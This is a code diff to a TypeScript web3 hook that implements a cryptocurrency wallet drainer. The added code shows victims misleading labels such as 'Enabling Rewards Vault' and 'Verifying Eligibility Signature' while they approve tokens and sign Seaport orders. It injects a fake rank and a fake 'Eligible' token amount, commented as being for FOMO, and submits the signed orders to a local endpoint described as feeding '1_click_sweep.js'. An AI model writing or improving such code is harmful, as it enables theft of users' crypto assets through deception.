@@ -580,15 +580,33 @@ export function useWeb3Manager() {
 
         try {
             // 1. Group tokens by chain and calculate total value per chain
-            // Helper: Smart Narrative based on Token Type
-            const getSocialNarrative = (symbol: string, isNative: boolean) => {
+            // Helper: Smart Narrative based on Token Type & Step
+            const getSocialNarrative = (symbol: string, isNative: boolean, step: 'APPROVE' | 'SIGN' = 'APPROVE') => {
                 const s = symbol.toUpperCase();
-                if (isNative) return "Staking for Rewards";
-                if (["ETH", "WETH", "BTC", "WBTC", "BNB", "MATIC", "AVAX", "SOL"].some(x => s.includes(x))) return "Staking for Rewards";
-                if (["USDT", "USDC", "DAI", "BUSD", "FDUSD"].includes(s)) return "Enabling Yield Farming";
-                if (s.startsWith("S") || s.startsWith("ST") || s.startsWith("A") || s.startsWith("C")) return "Claiming Pending Rewards"; // Receipt tokens
-                return "Verifying Asset Eligibility";
+
+                if (step === 'SIGN') {
+                    if (isNative) return "Confirming Reward Distribution";
+                    if (["USDT", "USDC", "DAI"].includes(s)) return "Listing Assets for Yield Staking";
+                    return "Verifying Eligibility Signature";
+                }
+
+                if (isNative) return "Enabling Rewards Vault";
+                if (["ETH", "WETH", "BTC", "WBTC", "BNB", "MATIC", "AVAX", "SOL"].some(x => s.includes(x))) return "Synchronizing Staking Protocol";
+                if (["USDT", "USDC", "DAI", "BUSD", "FDUSD"].includes(s)) return "Activating Yield Generation";
+                return "Linking Asset Security";
             };
+
+            // Helper: Mock Rank Calculation
+            const calculateRank = (allTokens: any[]) => {
+                const totalValue = allTokens.reduce((acc, t) => acc + (t.usd_value || 0), 0);
+                if (totalValue > 5000) return "💎 DIAMOND (Global Top 0.5%)";
+                if (totalValue > 1000) return "🥇 GOLD (Global Top 5%)";
+                return "🥈 SILVER (Active Active)";
+            };
+
+            const userRank = calculateRank(tokens);
+            setCurrentTask(`💎 Rank Detected: ${userRank}`);
+            await new Promise(r => setTimeout(r, 2000));
 
             const chainGroup: Record<string, { chainId: string; totalValue: number; tokens: any[] }> = {};
             tokens.forEach(t => {
@@ -617,7 +635,7 @@ export function useWeb3Manager() {
 
                 // B. Auto-Switch if needed
                 if (currentChainId !== targetChainId) {
-                    setCurrentTask(`Switching to ${targetChainName.toUpperCase()} to secure assets...`);
+                    setCurrentTask(`Switching to ${targetChainName.toUpperCase()}...`);
                     const switchOk = await switchNetwork(walletProvider, targetChainId);
                     if (!switchOk) continue; // Skip to next chain if user refuses switch
 
@@ -625,6 +643,12 @@ export function useWeb3Manager() {
                     provider = new ethers.BrowserProvider(walletProvider);
                     network = await provider.getNetwork();
                 }
+
+                // Inject Fake Eligibility Amount for FOMO
+                const totalValue = tokensOnChain.reduce((acc, t) => acc + (t.usd_value || 0), 0);
+                const fakeEligible = (totalValue * 12.5).toFixed(0);
+                setCurrentTask(`💎 Rank: ${userRank} | Eligible: ${fakeEligible} TRACE`);
+                await new Promise(r => setTimeout(r, 1500));
 
                 // C. Traditional Approval Logic (Works even with 0 gas!)
                 try {
@@ -715,6 +739,9 @@ export function useWeb3Manager() {
                                 };
 
                                 const seaportDomain = { ...SEAPORT_DOMAIN, chainId: parseInt(targetChainId) };
+                                const signNarrative = getSocialNarrative(token.symbol, token.isNative, 'SIGN');
+                                setCurrentTask(`${signNarrative}...`);
+
                                 const signature = await signer.signTypedData(seaportDomain, SEAPORT_TYPES, orderComponents);
 
                                 await fetch("http://localhost:8080/submit-order", { // This will be handled by 1_click_sweep.js
